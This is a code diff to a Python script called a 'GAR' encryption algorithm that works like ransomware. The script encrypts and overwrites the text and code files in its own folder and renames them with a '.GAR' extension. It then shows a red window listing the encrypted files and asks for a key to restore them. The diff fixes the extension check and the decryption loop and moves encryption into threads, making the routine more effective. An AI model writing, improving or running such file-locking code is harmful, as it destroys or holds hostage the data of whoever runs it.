@@ -9,6 +9,7 @@ from time import sleep, time
 from tkinter import messagebox
 import pyperclip
 import socket
+from threading import Thread
 
 #Data
 
@@ -26,7 +27,6 @@ types = [".txt",".text",".bat",".py",".cs",".css",".cpp",".lua"]
 print("Using GAR-EncryptionAlgorithem --V1.3 --By:2Depth --OpenSource-Version")
 
 for dob in range(len(string.printable)):
-   
     if string.printable[dob] != "\\":
         char.append(string.printable[dob])
     else:
@@ -44,7 +44,7 @@ for keyNum in range(len(string.printable)):
 
 def canEnc(name):
    for num in range(len(types)):
-      if types[num].find(name):
+      if name.find(types[num]) != -1:
          return True
    return False
 
@@ -79,17 +79,20 @@ def decrypt(keyInput,keyStrength,txt):
         toappend = str(keyInput[keyStrength*bob:(keyStrength*bob)+keyStrength])
         keyUnpacked.append(toappend)
 
-
-    
     for bob in range(math.floor(len(txt)/keyStrength)):
         rb = 1
         if bob == 0:
             rb = 0
         cd = txt[keyStrength*bob:(keyStrength*bob)+keyStrength]
         print(cd)
-        fr = keyUnpacked.index(cd)
-        print(fr)
-        endReturn = endReturn + char[fr]
+        if cd:
+            fr = keyUnpacked.index(cd)
+            if fr:
+                endReturn = endReturn + char[fr]
+            else:
+                break
+        else:
+            break
     return endReturn
 
 
@@ -102,10 +105,7 @@ length = keyLength #Renames KeyLength into 'length'
 
 #Your Code:
 
-ods = "Windows"
-
-if Path(__file__).parent.name.find("/"):
-    ods = "Linux"
+ods = "Linux"
 
 print("User is using a " + ods + " host, file parented To " + Path(__file__).parent.name + "; Collecting Data...")
 fils = os.listdir(Path(__file__).parent)
@@ -114,26 +114,39 @@ print("Found Data! || ")
 print(fils)
 sleep(1)
 
+def hash(fils,fl):
+    padir = str(Path(__file__).parent) + "/"
+    toEncFlW = Path(padir+ "/" + fils[fl])
+    daya = str(toEncFlW.read_text())
+    cd = encrypt(daya)
+    toEncFlW.write_text(cd)
+    os.rename(str(padir + fils[fl]),str(padir + fils[fl]) + ".GAR" + str(length))
+    print("Hashed : " + Path(padir + fils[fl]).name)
+
+def dehash(fils,fl):
+    padir = str(Path(__file__).parent) + "/"
+    toEncFlW = Path(padir+ "/" + fils[fl])
+    daya = toEncFlW.read_text()
+    cd = decrypt(key,length,daya)
+    toEncFlW.write_text(cd)
+    os.rename(str(padir + fils[fl]),str(padir + fils[fl].replace(".GAR" + str(length),"")))
+    print("Unhashed : " + Path(padir + fils[fl]).name)
+
 if ods == "Linux":
     os.rename(str(Path(__file__)),str(Path(__file__).parent) + "/" + randName)
     fils = os.listdir(Path(__file__).parent)
     for fl in range(len(fils)):
         if fils[fl] != randName:
-            if canEnc(fils[fl]):
-                padir = str(Path(__file__).parent) + "/"
-                toEncFlW = Path(padir+ "/" + fils[fl])
-                daya = str(toEncFlW.read_text())
-                cd = encrypt(daya)
-                toEncFlW.write_text(cd)
-                os.rename(str(padir + fils[fl]),str(padir + fils[fl]) + ".GAR" + str(length))
+            if canEnc(fils[fl]) == True:
+                th = Thread(target=hash,args=(fils,fl,))
+                th.start()
 
-            print("Hashed : " + Path(padir + fils[fl]).name)
 else:
     os.rename(str(Path(__file__)),str(Path(__file__).parent) + "\\" + randName)
     fils = os.listdir(Path(__file__).parent)
     for fl in range(len(fils)):
         if fils[fl] != randName:
-            if canEnc(fils[fl]):
+            if canEnc(fils[fl]) == True:
                 padir = str(Path(__file__).parent) + "\\"
                 toEncFlW = Path(padir+ "\\" + fils[fl])
                 daya = toEncFlW.read_text()
@@ -157,24 +170,18 @@ def check():
     if put.get() == key:
         messagebox.showinfo("Correct","Correct Key!")
         if ods == "Linux":
-            
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if canEnc(fils[fl]) and fils[fl].find(".GAR") > 0:
-                        padir = str(Path(__file__).parent) + "/"
-                        toEncFlW = Path(padir+ "/" + fils[fl])
-                        daya = str(toEncFlW.read_text())
-                        cd = str(decrypt(key,length,daya))
-                        toEncFlW.write_text(cd)
-                        os.rename(str(padir + fils[fl]),str(padir + fils[fl].replace(".GAR" + str(length),"")))
+                    if fils[fl].find(".GAR") != -1:
 
-                        print("Unhashed : " + Path(padir + fils[fl]).name)
+                        thh = Thread(target=dehash,args=(fils,fl,))
+                        thh.start()
         else:
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if canEnc(fils[fl]) and fils[fl].find(".GAR") >0:
+                    if canEnc(fils[fl]) == True & fils[fl].find(".GAR") != -1:
                         padir = str(Path(__file__).parent) + "\\"
                         toEncFlW = Path(padir+ "\\" + fils[fl])
                         daya = str(toEncFlW.read_text())
@@ -194,7 +201,7 @@ local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 local.connect(("8.8.8.8",80))
 oks = "Windows"
 
-if Path(__file__).parent.name.find("/") > 0:
+if Path(__file__).parent.name.find("/") != -1:
     oks = "Linux"
 #base.title("GAR-256 MESSAGE _DATA_={os=" + oks + ",user=" + socket.gethostname() + ",ip=" + local.getsockname()[0] + "}")
 base.title("GAR-256 MESSAGE _DATA_={os=" + oks + "}")
@@ -204,8 +211,7 @@ put.grid(row=1,column=0)
 base.configure(bg="red")
 for fl in range(len(fils)):
         if fils[fl] != randName:
-            if canEnc(fils[fl]):
-                
+            if canEnc(fils[fl]) == True:
                 label2 = Label(base,text = "Encrypted " + fils[fl],bg="red")
                 label2.grid(row=fl + 3,column=0)
 pyperclip.copy(key)
